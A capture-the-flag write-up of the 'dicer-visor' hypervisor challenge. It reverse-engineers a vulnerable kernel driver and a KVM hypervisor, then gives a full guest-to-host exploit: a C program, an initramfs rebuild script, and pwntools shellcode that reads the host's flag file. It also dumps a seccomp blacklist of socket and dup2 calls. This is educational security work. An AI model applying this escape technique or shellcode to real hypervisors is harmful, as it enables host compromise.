# dicer-visor

Categories: Pwn

Description:
> Welcome to DiceGang's newest hypervisor-based security solution, Dicer-Visor.
>
> `nc mc.ax 31313`
> 
>author: SmoothHacker
>
>[initramfs.cpio.gz](src/initramfs.cpio.gz) [dicer-visor](src/dicer-visor) [bzImage](src/bzImage)

**Tags:** hypervisor pwn

## Takeaways

* From userland, to kernel, to hypervisor, and finally to a pwned hypervisor.

## Solution

### Recon

For this challenge, we are given 3 files: A kernel image, an initramfs, and the `dicer-visor` binary which is the hypervisor itself.

```bash
fane@ctf-box:~/dicer-visor$ file dicer-visor
dicer-visor: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for GNU/Linux 3.2.0, not stripped
fane@ctf-box:~/dicer-visor$ ./dicer-visor
Usage: ./dicer-visor <bzImage> <initrd>
```

Let's run the challenge locally:

```log
fane@ctf-box:~/dicer-visor$ ./dicer-visor bzImage initramfs.cpio.gz
Dicer-visor - DiceGang Security Hypervisor
[*] Created VM
[*] Loaded kernel image: bzImage
[*] Loaded initrd image: initramfs.cpio.gz
[*] Starting up VM
Booting from ROM...
[    0.000000] Linux version 6.0.0 (scott@blackrock) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU 3
[    0.000000] Command line: console=ttyS0 nokaslr
[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
...
[    0.468004] Run /init as init process
/init: line 7: can't create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy
[    0.528008] vuln: loading out-of-tree module taints kernel.
[    0.532008] [!] Vulnerable Driver Loaded
/bin/sh: can't access tty; job control turned off
/ # uname -a
Linux (none) 6.0.0 #15 Fri Feb 3 13:31:55 UTC 2023 x86_64 GNU/Linux
/ #
```

So, the binary spawns a VM with the given initramfs and drops us to a shell. The VM is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module (`[!] Vulnerable Driver Loaded`). Inside the initramfs, we find the `vuln.ko` kernel module which we will analyze in a bit. We also can see the contents of `init`:

```bash
/ # cat init
#!/bin/sh

#mount -t proc none /proc
#mount -t sysfs none /sys
#mount -t debugfs none /sys/kernel/debug

echo 1 > /sys/module/rcutree/parameters/rcu_cpu_stall_suppress

/sbin/insmod /vuln.ko
mknod /dev/exploited-device c 32 0

exec /bin/sh
/ #
```

Interesting! The `vuln.ko` kernel module is loaded and the character device `/dev/exploited-device` is created. But what is the exploitation strategy here? Probably we need to interact with `vuln.ko` from inside the VM, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. Let's also try running on remote:

When we connect to the remote, it asks us for a URL to download an `initramfs` and then spawns the VM. When providing the original `initramfs`, after the VM loads, we get a kernel panic, probably crashing at `exec /bin/sh` in `init`. This is because on the remote side they probably have deleted the contents of `/bin/*` to avoid easy exploitation. So, let's start analyzing the challenge files.

### Analysis - `vuln.ko`

First, let's extract the `initramfs` and load the `vuln.ko` in ghidra. We first analyze the entry and exit points of the kernel module which are `init_module` and `cleanup_module` respectively:

```c
void init_module(void) {
  long lVar1;
  
  __register_chrdev(0x20,0,0x100,"exploited-device",fops);
  lVar1 = __request_region(&ioport_resource,0xdead,1,"exploited-device",0);
  if (lVar1 == 0) {
    _printk("\x011[!] IO port allocation of 0x%x failed\n",0xdead);
  }
  else {
    lVar1 = __request_region(&ioport_resource,0xd1ce,1,"exploited-device",0);
    if (lVar1 == 0) {
      _printk("\x011[!] IO port allocation of 0x%x failed\n",0xd1ce);
    }
    else {
      _printk("\x011[!] Vulnerable Driver Loaded\n");
    }
  }
  __x86_return_thunk();
  return;
}
void cleanup_module(void) {
  __x86_return_thunk();
  return;
}
```

As we can see, the `init_module` creates the **character device** `/dev/exploited-device` with major number 32, base minor 0, and 0x100 minor numbers available to it ([docs/`__register_chrdev`](https://www.kernel.org/doc/htmldocs/kernel-api/API---register-chrdev.html)). Next, it creates to regions for this device, both with size 1 byte. The first region is ad address `0xdead` and the second region at address `0xd1ce` ([docs/`__request_region`](https://www.kernel.org/doc/htmldocs/kernel-api/API---request-region.html)).

The `fops` variable in `__register_chrdev()`, is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. Usually, userland applications interact with the device through the `/dev` filesystem and file descriptors. From the `init` file, you should recall the line `mknod /dev/exploited-device c 32 0`, which makes a special **character device** with the same major and minor numbers as in the `__register_chrdev()` call.

Back to the `fops` variable. This variable is of type `struct file_operations` and is basically a [big list of function pointers](https://elixir.bootlin.com/linux/v6.0/source/include/linux/fs.h#L2093). These function pointers describe how the character device behaves when interacted as a file through `/dev/exploited-device`, e.g. via `open`, `read`, `ioctl`, etc.

So, let's examine all the registered function pointers in `fops`:

```c
char shellcode[256]; //global variable

int open(struct inode *, struct file *) { 
  return 0;
}
void release(struct inode *, struct file *) {
    return 0;
}
ssize_t read(struct file *, char __user *, size_t, loff_t *) {
  return 0;
}
ssize_t write(struct file *, const char __user * __buf, size_t __n, loff_t *) {
  size_t copy_sz;
  ssize_t sVar1;
  
  copy_sz = MIN(__n, 0x100);
  _copy_from_user(shellcode,__buf,copy_sz);
  sVar1 = __x86_return_thunk();
  return sVar1;
}
void tl_ioctl(struct file *file, unsigned int cmd, unsigned long) {
  long i;
  _printk("\x011[!] driver ioctl issued - cmd: %d\n", cmd);
  if (cmd == 0xbeef) {
    OUT(0xd1ce,0xd1ce); //OUT DX,AX
    native_io_delay();
  } else if (cmd == 0xdead) {
    for(i=0; i<0x100; i++) {
      OUT(0xdead,shellcode[i]); //OUT DX,AL
      native_io_delay();
    }
  }
  return 0;
}
```

So, to summarize the above operations:

* `open`: noop.
* `release`: noop
* `read`: noop
* `write`: Writes to the global `shellcode` kernel buffer up to `0x100` bytes provided by the userland `buf`.
* `ioctl`: The [`OUT`](https://c9x.me/x86/html/file_module_x86_id_222.html) that appear in the body of the function, are x86-specific assembly instructions. These instructions are used for port I/O, i.e. communication with hardware peripherals. Since we are running inside a VM, we expect that these instructions will cause a trap to the hypervisor. (Usually the VM runs at a lower privilege level than these instructions can be executed [[1](https://people.eecs.berkeley.edu/~kubitron/cs262/lectures/lec13-VM1.pdf), [2](http://www.cs.cmu.edu/~410-f06/lectures/L31_Virtualization.pdf), [3](http://www.cs.cmu.edu/~410-s09/lectures/L33_Virtualization.pdf)])

So, the `ioctl` command `0xbeef` writes to the I/O port `0xd1ce` the value `d1ce`; and the `iotctl` command `0xdead` writes to the I/O port `0xdead` the `shellcode` buffer (`0x100` bytes). Now it's time to analyze the hypervisor!

### Analysis - `dice-visor`

```bash
fane@ctf-box:~/dicer-visor$ file dicer-visor
dicer-visor: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9ef7fc5756088242c50b7f6b1dbee7ccee624de, for GNU/Linux 3.2.0, not stripped
```

Fortunately, the hypervisor still has symbols as it is not stripped. Let's start the analysis from the `main` function:

```c
int main(int argc,char **argv) {
  int iVar1;
  char *err_msg;
  int aiStack72 [2];
  int fd;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  if (argc != 3) {
    fwrite("Usage: ./dicer-visor <bzImage> <initrd>\n",0x28,1,stderr);
    return -1;
  }
  puts("Dicer-visor - DiceGang Security Hypervisor");
  fd = open("/dev/kvm",0x80002);
  if (fd == -1) {
    return err(1, "/dev/kvm");
  } else {
    iVar1 = ioctl(fd,0xae00,0);
    if (iVar1 == 0xc) {
      init_vm(aiStack72);
      puts("[*] Created VM");
      load_vm((long)aiStack72,argv[1],argv[2]);
      printf("[*] Loaded kernel image: %s\n",argv[1]);
      printf("[*] Loaded initrd image: %s\n",argv[2]);
      puts("[*] Starting up VM");
      run_vm(aiStack72);
      cleanup_vm(aiStack72);
      puts("[*] Exited VM");
      return 0;
    } else if (iVar1 != -1) {
      return err(1,"KVM_GET_API_VERSION %d, expected 12",iVar1);
    }
    return err(1, "KVM_GET_API_VERSION");
  }
}
```

As we see, the hypervisors uses the [Kernel's KVM API](https://docs.kernel.org/virt/kvm/api.html) to create the virtual machine. `init_vm` performs a lot of `ioctl` system calls, while `load_vm` does not perform any `ioctl` and simply `mmap`s the bzImage and the initramfs, sets some state variables in `aiStack72`, and then returns. The value `0xae00` in the `ioctl`, corresponds to the [`#define KVM_GET_API_VERSION _IO(KVMIO,   0x00)`](https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h#L917), where [`KVMIO` holds the value 0xAE](https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h#L889). With a little bit of manual reverse engineering effort, we recover the struct for `aiStack72` and also have a clean decompilation of the whole hypervisor:

```c

// ghidra-kvm.h contains struct definitions and macro #defines related to the KVM API.
// Extracted from the source code of the Linux kernel.
// e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h
// Consult the kernel source code and its documentation for what the structs are.
// file located in solution/ghidra-kvm.h
#include "ghidra-kvm.h"

struct vm {
    int vm_fd;
    int vcpu_fd;
    int kvm_fd;
    undefined[4] padding;
    void *userspace_address;
}

undefined8 init_vm(struct vm *vm);
undefined8 load_vm(struct vm *vm,char *bzImage_path,char *initramfs_path);
undefined8 run_vm(struct vm *vm);
undefined8 cleanup_vm(struct vm *vm);

int main(int argc,char **argv) {
  int iVar1;
  char *pcVar2;
  struct vm vm;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  if (argc != 3) {
    fwrite("Usage: ./dicer-visor <bzImage> <initrd>\n",0x28,1,stderr);
    return -1;
  }
  puts("Dicer-visor - DiceGang Security Hypervisor");
  vm.kvm_fd = open("/dev/kvm",0x80002);
  if (vm.kvm_fd == -1) {
    return err(1, "/dev/kvm");
  } else {
    iVar1 = ioctl(vm.kvm_fd,KVM_GET_API_VERSION ,0);
    if (iVar1 == 0xc) {
      init_vm(&vm);
      puts("[*] Created VM");
      load_vm(&vm,argv[1],argv[2]);
      printf("[*] Loaded kernel image: %s\n",argv[1]);
      printf("[*] Loaded initrd image: %s\n",argv[2]);
      puts("[*] Starting up VM");
      run_vm(&vm);
      cleanup_vm(&vm.vm_fd);
      puts("[*] Exited VM");
      return 0;
    } else if (iVar1 != -1) {
      return err(1,"KVM_GET_API_VERSION %d, expected 12",iVar1);
    }
    return err(1,"KVM_GET_API_VERSION");
  }
}


/* WARNING: Could not reconcile some variable overlaps */
undefined8 init_vm(struct vm *vm) {
  int iVar1;
  void *userspace_addr;
  char *pcVar2;
  undefined8 local_70;
  struct kvm_userspace_memory_region kvm_userspace_memory_region;
  kvm_pit_config kvm_pit_config;
  
  iVar1 = ioctl(vm->kvm_fd,KVM_CREATE_VM ,0);
  vm->vm_fd = iVar1;
  if (iVar1 < 0) {
    pcVar2 = "[!] VM creation failed";
  } else {
    iVar1 = ioctl(iVar1,KVM_SET_TSS_ADDR,0xfffbd000);
    if (iVar1 < 0) {
      pcVar2 = "[!] Failed to set TSS addr";
    } else {
      local_70 = 0xffffc000;
      iVar1 = ioctl(vm->vm_fd,KVM_SET_IDENTITY_MAP_ADDR,&local_70);
      if (iVar1 < 0) {
        pcVar2 = "[!] Failed to set identity map addr";
      } else {
        iVar1 = ioctl(vm->vm_fd,KVM_CREATE_IRQCHIP,0);
        if (iVar1 < 0) {
          pcVar2 = "[!] Failed to create irq chip";
        } else {
          kvm_pit_config.pad._44_16_ = ZEXT816(0);
          kvm_pit_config.pad._28_16_ = ZEXT816(0);
          kvm_pit_config.pad._12_16_ = ZEXT816(0);
          kvm_pit_config._0_16_ = ZEXT816(0);
          iVar1 = ioctl(vm->vm_fd,KVM_CREATE_PIT2,&kvm_pit_config);
          if (iVar1 < 0) {
            pcVar2 = "[!] Failed to create i8254 interval timer";
          } else {
            userspace_addr = mmap(NULL,0x10000000,3,0x4021,-1,0);
            vm->userspace_address = userspace_addr;
            if (userspace_addr == NULL) {
              pcVar2 = "[!] Failed to mmap VM memory";
            } else {
              kvm_userspace_memory_region._0_8_ = 0x100000000;
              kvm_userspace_memory_region.guest_phys_addr._0_4_ = 0;
              kvm_userspace_memory_region.guest_phys_addr._4_4_ = 0;
              kvm_userspace_memory_region.memory_size._0_4_ = 0x10000000;
              kvm_userspace_memory_region.memory_size._4_4_ = 0;
              kvm_userspace_memory_region.userspace_addr = (ulong)userspace_addr;
              iVar1 = ioctl(vm->vm_fd,KVM_SET_USER_MEMORY_REGION,&kvm_userspace_memory_region);
              if (iVar1 < 0) {
                pcVar2 = "[!] Failed to set user memory region";
              } else {
                iVar1 = ioctl(vm->vm_fd,KVM_CREATE_VCPU,0);
                vm->vcpu_fd = iVar1;
                if (-1 < iVar1) {
                  initVMRegs(vm);
                  createCPUID(vm);
                  return 0;
                }
                pcVar2 = "[!] Failed to create vcpu";
              }
            }
          }
        }
      }
    }
  }
  err(1,pcVar2);
}

void *jit_mem;
int jit_mem_counter;
undefined8 run_vm(struct vm *vm) {
  int iVar1;
  kvm_run *vcpu;
  long idx;
  undefined seccomp_filter[]; //length omitted
  ushort port;
  
  iVar1 = ioctl(vm->kvm_fd,KVM_GET_VCPU_MMAP_SIZE,0);
  vcpu = (kvm_run *)mmap(NULL,iVar1,PROT_READ|PROT_WRITE,MAP_SHARED,vm->vcpu_fd,0);
  jit_mem = (code *)mmap(NULL,0x100,PROT_READ|PROT_WRITE|PROC_EXEC,
                         MAP_SHARED|MAP_ANONYMOUS|MAP_NORESERVE,-1,0
  );
  jit_mem_counter = 0;

  /* init seccomp_filter */
  /*       ...           */

  //Set seccomp filter
  iVar1 = prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
  if (iVar1 != 0) {
    perror("prctl(NO_NEW_PRIVS)");
  }
  iVar1 = prctl(PR_SET_SECCOMP,2,seccomp_filter);
  if (iVar1 != 0) {
    close(vm->vcpu_fd);
    close(vm->vm_fd);
    close(vm->kvm_fd);
    munmap(vm->userspace_address,0x40000000);
    perror("prctl(SECCOMP)");
    //BUG? If the seccomp filter fails, then we still attempt to execute the remaining of this function.
    //But the file descriptors have been closed and memory has been unmapped. Oh well..
  }

  //run the VM
  iVar1 = ioctl(vm->vcpu_fd,KVM_RUN,0);
  while( true ) {
    if (iVar1 < 0) {
      return err(1,"kvm_run failed");
    }
    if (vcpu->exit_reason != KVM_EXIT_IO)
        break;

        /* union case: KVM_EXIT_IO */
    port = vcpu->unlabelled32.io.port;  //vcpu->unlabelled32.io.port
    if ((short)port < 0x61) {
      if (port == 0xd1ce) {
        (*jit_mem)();
      } else if ((port == 0xdead) && (vcpu->unlabelled32.io.direction == KVM_EXIT_IO_OUT)) {
        idx = (long)jit_mem_counter;
        if (idx <= 0x100) { //unintended off-by-one.
          jit_mem_counter++;
          jit_mem[idx] = *((char*)vcpu + vcpu->unlabelled32.io.data_offset);
        } else {
          puts("[!] Maximum bytes read from guest");
        }
      }
    } else if (port == 0x61 && vcpu->unlabelled32.io.direction == KVM_EXIT_IO_IN) {
        *((char*)vcpu + vcpu->unlabelled32.io.data_offset) = 'd';
    } else if (port == 0x3fd && vcpu->unlabelled32.io.direction == KVM_EXIT_IO_IN) {
        *((char*)vcpu + vcpu->unlabelled32.io.data_offset) = ' ';
    } else if ((port == 0x3f8) && (vcpu->unlabelled32.io.direction == KVM_EXIT_IO_OUT)) {
      write(1, (char*)vcpu + vcpu->unlabelled32.io.data_offset, 1);
    }
    iVar1 = ioctl(vm->vcpu_fd,KVM_RUN,0); //continue the VM
  }
  printf("[!] Unknown Exit Reason: %d\n", vcpu->exit_reason);
  return -1;
}

undefined8 cleanup_vm(struct vm *vm) {
  close(vm->vcpu_fd);
  close(vm->vm_fd);
  close(vm->kvm_fd);
  munmap(vm->userspace_address,0x40000000);
  return 0;
}
```

The `run_vm` now is quite self-explanatory and interesting. As we recall from the `vuln.ko`, there were two `OUT` x86 instructions that we could invoke: `OUT(0xd1ce,0xd1ce)` and `OUT(0xdead,shellcode[i])`. From the hypervisor's code, we can see that when the `port` is `0xd1ce`, the contents of the `jit_mem` are executed. When the `port` is `0xdead`, we write to the `jit_mem` the value of the source operand from the `OUT` x86 instructions. So, to sum it up:

* `write` syscall to the `/dev/exploited-device`: Writes up to `0x100` bytes to the kernel's `shellcode` buffer from a userland provided buffer.
* ioctl cmd `0xdead`: `OUT(0xdead, shellcode[i])`. Writes the `0x100` bytes from the kernel's `shellcode` buffer to the hypervisor's `jit_mem`. May be called only once. (Otherwise you get the message "Maximum bytes read from guest".)
* ioctl cmd `0xbeef`: `OUT(0xd1ce,0xd1ce)`. Will execute the contents in the `jit_mem` buffer. i.e. It will execute the shellcode provided from userland.

#### seccomp filter

One last thing to notice about `run_vm`, is that it sets up a seccomp filter. Using [seccomp-tools](https://github.com/david942j/seccomp-tools), we can easily dump it:

```bash
fane@ctf-box:~/dicer-visor$ seccomp-tools dump "./dicer-visor bzImage initramfs.cpio.gz"
Dicer-visor - DiceGang Security Hypervisor
[*] Created VM
[*] Loaded kernel image: bzImage
[*] Loaded initrd image: initramfs.cpio.gz
[*] Starting up VM
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006
 0005: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0006: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0008
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0008: 0x15 0x00 0x01 0x00000021  if (A != dup2) goto 0010
 0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0010: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

So, this is a blacklist of `socket`, `fork`, `dup2`, and `execveat` system calls. However, we can still use `open` and `write`, and the remote provides us the output of the hypervisor!

### Exploitation

So, let's create a userland program that when executed performs the trip to the `hypervisor` and executes some shellcode:

```c
//main.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

const char *shellcode = "\x90\x90\x90\x90"; //4x "nop" instruction
const size_t shellcode_len = 4;

int main(int argc, char ** argv) {
    int fd = open("/dev/exploited-device", O_RDWR);
    if(fd == -1) {
        perror("open"); exit(1);
    }

    ssize_t res = write(fd, shellcode, shellcode_len);
    if(res != shellcode_len) {
        printf("write error. Written: %ld\n", res); exit(1);
    }
    if ( (res = ioctl(fd, 0xdead)) < 0) { //write shellcode to supervisor
        perror("ioctl1"); exit(1);
    }
    if ( (res = ioctl(fd, 0xbeef)) < 0) { //invoke shellcode
        perror("ioctl2"); exit(1);
    }

    return 0;
}
```

Next, let's write a script that builds our userland program and re-creates the initramfs:

```bash
#!/bin/sh

set -e
gcc -static main.c -o main
mv main initramfs

cd initramfs
find . -print0 | cpio --null --create --verbose --format=newc | gzip --best > ../initramfs_patched.cpio.gz
cd -
```

Finally, we modify the `init` script to invoke our `main` program when the kernel boots:

```bash
#!/bin/sh

echo 1 > /sys/module/rcutree/parameters/rcu_cpu_stall_suppress
echo "Hello kernel world!"

/sbin/insmod /vuln.ko
mknod /dev/exploited-device c 32 0
chmod ugo+x /main

exec /main
```

#### Shellcode generation

To generate our shellcode and dump the flag, we use [pwntools](https://github.com/Gallopsled/pwntools)

```python
# gen-shellcode.py
from pwn import *

# Set up pwntools for the correct architecture.
context.binary = elfexe = ELF('./dicer-visor')

def dumpShellcode(shellcode):
    shellcode_str = ''
    for b in shellcode:
        shellcode_str += "\\x{:02x}".format(b)
    msg  = f'const char *shellcode = "{shellcode_str}";\n'
    msg += f'const size_t shellcode_len = {len(shellcode)};'
    print(msg)

shellcode = asm(
    '''
    xor     rdx, rdx /* O_RDONLY */
    ''' +
    pwnlib.shellcraft.linux.cat("flag.txt")
)
dumpShellcode(shellcode)
```

When we execute `python gen-shellcode.py`, we get our C-style formatted shellcode which we can plug into our main.c:

```bash
fane@ctf-box:~/dicer-visor$ python gen-shellcode.py
const char *shellcode = "\x48\x31\xd2\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05";
const size_t shellcode_len = 47;
```

#### Getting the flag

Finally we run `build.sh` to create the `initramfs_patched.cpio.gz` that contains the modified `init` script and our `main` binary. When we connect to the remote and provide our `initramfs_patched.cpio.gz` for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of `flag.txt`!

`dice{dicer-visor-rules}`
